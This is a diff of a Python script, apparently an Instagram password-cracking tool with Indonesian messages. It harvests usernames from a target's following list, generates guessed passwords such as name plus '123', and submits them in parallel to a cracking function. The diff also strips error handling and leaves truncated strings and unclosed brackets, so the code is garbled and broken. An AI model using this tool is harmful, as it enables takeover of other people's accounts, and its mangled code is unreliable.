@@ -12,8 +12,7 @@ try:
 	import requests
 	import stdiomask
 	import urllib.request
-except ImportError as e:
-	exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
+
 
 from time import sleep
 from concurrent.futures import ThreadPoolExecutor
@@ -328,12 +327,9 @@ class instagram:
 		uuid=generateUUID(True)
 		xx=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
 		crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
-		s.headers.update({'Connection': 'close',
-                       'Accept': '*/*',
-                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                       'Cookie2': '$Version=1',
-                       'Accept-Language': 'en-US',
-                       'User-Agent': User_Agent()})
+		s.headers.update({'Connection': 'close
+
+
 
 		data = json.dumps({'_uuid': uuid,
                            '_uid': username_id,
@@ -363,13 +359,7 @@ class instagram:
 		try:
 			m=s.get('https://www.instagram.com/%s/?__a=1'%(id),cookies=cookie,headers={"user-agent":USN})
 			m_jason=m.json()["graphql"]["user"]
-			idx=m_jason["id"]
-
-		except requests.exceptions.ConnectionError:
-			exit(f"\n [{M}!{C}] Koneksi internet bermasalah")
-		except Exception as e:
-			exit(f"\n [{M}!{C}] Username yang anda masukan tidak di temukan pastikan target bersifat publik")
-		return idx
+			idx=m_jason["id"
 
 	def infoAPI(self,cookie,api,id):
 		try:
@@ -380,9 +370,6 @@ class instagram:
 				nama = i["full_name"]
 				internal.append(f'{username}|{nama}')
 				following.append(username)
-		except requests.exceptions.ConnectionError:
-			exit(f'\n [{M}!{C}] Koneksi internet bermasalah')
-		except Exception as e:
 			print(f'\n [{M}!{C}] Username yang anda masukan tidak di temukan')
 		return internal
 
@@ -453,20 +440,13 @@ class instagram:
 								else:
 									sandi=[w+'123',w,password.lower()]
 							shinkai.submit(self.crackAPI,username,sandi,uaAPI)
-				except:
-					pass
-		exit(f'\n\n [{K}|{C}] Crack Selesai...Ajg!!!')
-
-	def APIinfo(self,user):
-		try:
+				
 			x=s.get("https://www.instagram.com/%s/?__a=1"%(user),headers={"user-agent":USN})
 			x_jason=x.json()["graphql"]["user"]
 			nama=x_jason["full_name"]
 			pengikut=x_jason["edge_followed_by"]["count"]
 			mengikut=x_jason["edge_follow"]["count"]
-			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
-		except:
-			pass
+			postingan=x_jason["edge_owner_to_timeline_media"]["
 
 		return nama,pengikut,mengikut,postingan
 
